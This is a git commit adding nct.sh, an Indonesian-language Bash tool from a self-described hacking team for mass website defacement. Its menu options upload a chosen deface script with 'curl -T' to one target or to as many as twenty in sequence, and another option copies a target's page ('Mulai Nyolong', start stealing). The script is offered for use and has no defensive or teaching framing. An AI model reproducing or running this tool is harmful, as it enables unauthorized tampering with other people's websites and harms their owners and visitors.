e0a22aa6cbce6a4c8fdd3edf55a0601003c7afb6
Java riot <46644689+Javariot15@users.noreply.github.com>
2019-04-07 12:13:43 +0700

    Add files via upload

---
+++ nct.sh
@@ -0,0 +1,234 @@
+#usr/bin/sh
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+echo $red "_   _  ____ _____"
+echo $red "| \ | |/ ___|_   _|"
+echo $red "|  \| | |     | |"
+echo $white "| |\  | |___  | |"
+echo $white "|_| \_|\____| |_|"
+echo $indigo
+date
+echo $purple"___________________________________________________"
+echo $cyan" ["$red"+"$cyan"]Author by	: J@V@ R10T "
+echo $cyan" ["$red"+"$cyan"]Team        : Next Cyber Team		"
+echo $cyan" ["$red"+"$cyan"]Blog        : http://officialnct.zone.id"
+echo $cyan" ["$red"+"$cyan"]Github	: https://github.com/Javariot15"
+echo $purple"___________________________________________________"
+echo $red"	~"$cyan"{"$white"1"$cyan"}"$white".Deface"$cyan"		{"$white"Q"$cyan"}"$white"Quit "
+echo $red"	~"$cyan"{"$white"2"$cyan"}"$white".Takescript"$cyan"		{"$white"I"$cyan"}"$white"Info "
+echo $red"	~"$cyan"{"$white"3"$cyan"}"$white".Mode Banyak"$cyan
+echo $purple"___________________________________________________"
+echo $red"	~"$cyan"{"$white"T"$cyan"}"$white".TUTORIAL"$cyan
+echo $purple"___________________________________________________"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ "  apaan
+
+if [ $apaan = "1" ]
+then
+echo $red "_   _  ____ _____"
+echo $red "| \ | |/ ___|_   _|"
+echo $red "|  \| | |     | |"
+echo $white "| |\  | |___  | |"
+echo $white "|_| \_|\____| |_|"
+echo $green "Masukan Target !!!! "
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ "  target
+echo $green "Masukan Script !!!! "
+echo $green "taroh script di luar folder internal"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "[+]>>>>> = $target/$script "
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "2" ]
+then
+echo $red "_   _  ____ _____"
+echo $red "| \ | |/ ___|_   _|"
+echo $red "|  \| | |     | |"
+echo $white "| |\  | |___  | |"
+echo $white "|_| \_|\____| |_|"
+echo $yellow Mulai Nyolong
+echo $green "Mana Target !!!! "
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ "  target
+echo $green "Masukan nama script??(ex: script.html)"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " simpan
+curl -o $simpan $target
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "3" ]
+then
+echo $red "_   _  ____ _____"
+echo $red "| \ | |/ ___|_   _|"
+echo $red "|  \| | |     | |"
+echo $white "| |\  | |___  | |"
+echo $white "|_| \_|\____| |_|"
+figlet -f smshadow "MASAL"
+echo "### ctrl + c to quit ###"
+echo $red "Maksimal deface 20 terget"
+echo "Masukan Script !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white                               
+read -p " ╰─$ " script
+echo "Masukan Target1 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$red"$target1/$script"
+echo "Masukan Target2 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $cyan"["$green"+"$cyan"]"$red"$target2/$script"
+echo "Masukan Target3 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$red"$target3/$script"
+echo "Masukan Target4 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$red"$target4/$script"
+echo "Masukan Target5 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$red"$target5/$script"
+echo "Masukan Target6 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"$target6/$script"
+echo "Masukan Target7 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"$target7/$script"
+echo "Masukan Target8 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$red"$target8/$script"
+echo "Masukan Target9 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$red"$target9/$script"
+echo "Masukan Target10 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$red"$target10/$script"
+echo "Masukan Target11 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$red"$target11/$script"
+echo "Masukan Target12 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$red"$target12/$script"
+echo "Masukan Target13 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$red"$target13/$script"
+echo "Masukan Target14 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$red"$target14/$script"
+echo "Masukan Target15 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$red"$target15/$script"
+echo "Masukan Target16 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$red"$target16/$script"
+echo "Masukan Target17 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$red"$target17/$script"
+echo "Masukan Target18 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$red"$target18/$script"
+echo "Masukan Target19 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$red"$target19/$script"
+echo "Masukan Target20 !!!!"
+echo $white "╭─"$green"JAVA@localhost"$cyan" ~/NCTsystem"$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo $red"################# INFO ####################"
+echo $indigo"__________________________________________"
+echo $green"AUTHOR : j@V@ R10T			"
+echo $purple"GITHUB : https://github.com/Javariot15"
+echo $white"BLOG 1: https://officialnct.zone.id"
+echo $white"BLOG 2: https://officialnct.blogspot.com"
+echo $yellow"		  THANKS TO : "
+echo $cyan"[+] Next Cyber Team "
+echo $cyan"[+] Next Jaks "
+echo $cyan"[+] All Member NCT "
+echo $red"################# INFO ####################"
+echo $indigo"__________________________________________"
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat tutorial.txt
+exit
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " :) "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh nct.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
+
+
+#NCTsystem copyright
+#author by J@V@ R10t
+#NCT Next Cyber Team
+
